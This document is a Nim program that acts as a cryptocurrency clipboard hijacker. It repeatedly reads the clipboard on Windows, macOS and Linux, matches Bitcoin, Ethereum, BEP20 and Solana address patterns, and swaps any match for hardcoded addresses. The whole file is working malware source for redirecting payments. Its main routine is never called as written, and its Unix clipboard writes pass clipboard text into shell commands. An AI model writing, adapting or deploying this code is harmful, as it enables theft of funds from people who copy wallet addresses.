import os, re, strutils, times, osproc, winim

var
  btcAddress* = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
  ethAddress* = "0x1234567890abcdef1234567890abcdef12345678"
  bep20Address* = "0xabcdef1234567890abcdef1234567890abcdef12"
  solAddress* = "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"

let
  btcRegex = re"^[13bc1][a-km-zA-HJ-NP-Z1-9]{25,34}$"
  ethRegex = re"^0x[a-fA-F0-9]{40}$"
  solRegex = re"^[1-9A-HJ-NP-Za-km-z]{32,44}$"

proc isValidBitcoinAddress(address: string): bool =
  let valid = address.match(btcRegex)
  echo "checking btc: ", address, " -> ", valid
  valid

proc isValidEthereumAddress(address: string): bool =
  let valid = address.match(ethRegex)
  echo "checking eth: ", address, " -> ", valid
  valid

proc isValidBEP20Address(address: string): bool =
  let valid = isValidEthereumAddress(address)
  echo "checking bep20: ", address, " -> ", valid
  valid

proc isValidSolanaAddress(address: string): bool =
  let valid = address.match(solRegex)
  echo "checking sol: ", address, " -> ", valid
  valid

proc readClipboard(): string =
  when defined(windows):
    if OpenClipboard(0):
      defer: discard CloseClipboard()
      let hData = GetClipboardData(CF_TEXT)
      if hData != 0:
        let data = cast[cstring](GlobalLock(hData))
        defer: GlobalUnlock(hData)
        if data != nil:
          let clipboardText = $data
          echo "windows clipboard read: ", clipboardText
          return clipboardText.strip()
      echo "failed to read clipboard on windows"
      return ""
    else:
      echo "failed to open clipboard on windows: ", GetLastError()
      return ""
  elif defined(macosx):
    let cmd = "pbpaste"
    var (output, exitCode) = execCmdEx(cmd)
    if exitCode == 0:
      let result = output.strip()
      echo "macos clipboard read: ", result
      return result
    else:
      echo "error reading macos clipboard: ", output
      return ""
  else:
    let cmd = "xclip -selection clipboard -o"
    var (output, exitCode) = execCmdEx(cmd)
    if exitCode == 0:
      let result = output.strip()
      echo "linux clipboard read: ", result
      return result
    else:
      echo "error reading linux clipboard: ", output
      return ""

proc writeClipboard(content: string): bool =
  when defined(windows):
    if OpenClipboard(0):
      defer: discard CloseClipboard()
      EmptyClipboard()
      let hGlobal = GlobalAlloc(GMEM_MOVEABLE, content.len + 1)
      if hGlobal != 0:
        defer: GlobalFree(hGlobal)
        let data = cast[cstring](GlobalLock(hGlobal))
        copyMem(data, content.cstring, content.len + 1)
        GlobalUnlock(hGlobal)
        if SetClipboardData(CF_TEXT, hGlobal) != 0:
          echo "windows clipboard write: ", content
          return true
      echo "failed to write to windows clipboard: ", GetLastError()
      return false
    else:
      echo "failed to open windows clipboard: ", GetLastError()
      return false
  elif defined(macosx):
    let escapedContent = content.replace("\\", "\\\\").replace("\"", "\\\"")
    let cmd = "echo \"" & escapedContent & "\" | pbcopy"
    let exitCode = execShellCmd(cmd)
    if exitCode == 0:
      echo "macos clipboard write: ", content
      return true
    else:
      echo "error writing to macos clipboard"
      return false
  else:
    let escapedContent = content.replace("\\", "\\\\").replace("\"", "\\\"")
    let cmd = "echo \"" & escapedContent & "\" | xclip -selection clipboard"
    let exitCode = execShellCmd(cmd)
    if exitCode == 0:
      echo "linux clipboard write: ", content
      return true
    else:
      echo "error writing to linux clipboard"
      return false

proc controlCHook() {.noconv.} =
  echo "\nctrl+c detected, exiting."
  quit(0)

proc main() =
  setControlCHook(controlCHook)
  var initialContent = readClipboard()
  echo "initial clipboard: ", initialContent
  echo "ctrl+c to exit"

  while true:
    let content = readClipboard()
    if content.len > 0 and content != initialContent:
      echo "clipboard changed: ", content
      if btcAddress.len > 0 and content != btcAddress and isValidBitcoinAddress(content):
        if writeClipboard(btcAddress):
          echo "found btc, replaced with: ", btcAddress
          initialContent = btcAddress
        else:
          echo "failed to write btc address"
          initialContent = content
      elif ethAddress.len > 0 and content != ethAddress and isValidEthereumAddress(content):
        if writeClipboard(ethAddress):
          echo "found eth, replaced with: ", ethAddress
          initialContent = ethAddress
        else:
          echo "failed to write eth address"
          initialContent = content
      elif bep20Address.len > 0 and content != bep20Address and isValidBEP20Address(content):
        if writeClipboard(bep20Address):
          echo "found bep20, replaced with: ", bep20Address
          initialContent = bep20Address
        else:
          echo "failed to write bep20 address"
          initialContent = content
      elif solAddress.len > 0 and content != solAddress and isValidSolanaAddress(content):
        if writeClipboard(solAddress):
          echo "found sol, replaced with: ", solAddress
          initialContent = solAddress
        else:
          echo "failed to write sol address"
          initialContent = content
      else:
        echo "no crypto address found"
        initialContent = content

    sleep(500)

when not isMainModule:
  discard
